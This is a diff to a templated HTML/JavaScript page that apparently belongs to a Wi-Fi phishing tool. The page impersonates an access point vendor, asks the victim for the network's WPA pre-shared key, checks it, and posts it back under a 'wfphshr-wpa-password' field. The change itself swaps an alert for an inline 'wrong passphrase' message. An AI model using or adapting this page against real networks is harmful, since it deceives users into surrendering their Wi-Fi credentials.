@@ -159,7 +159,7 @@ In no event shall {{ target_ap_vendor }} Company or any other party which has be
         </div>
       </div>
       <div class="form-group has-feedback">
-          <label for="pwd">{{ target_ap_encryption }} Pre-Shared Key:</label>
+          <label for="pwd">{{ target_ap_encryption }} Pre-Shared Key: <span id="pw_status" style="color:blue"></span></label>
           <input class="form-control" type="password" id="pwd" disabled>
       </div>
       <div class="container text-center">
@@ -279,9 +279,10 @@ $("#btn").on("click", function(e) {
                             var objresponse = JSON.parse(jsonResponse);
                             var verify_status = objresponse['psk_verify']
                             if (verify_status == 'success') {
+                                document.getElementById("pw_status").innerHTML = ""
                                 post('post', {"wfphshr-wpa-password": input.value});
                             } else if (verify_status == 'fail') {
-                                alert('Wrong Passphrase!');
+                                document.getElementById("pw_status").innerHTML = "The passphrase is wrong!"
                             } else {
                                 /* we may not define the extensions and in that case
                                    just post the passphrase */
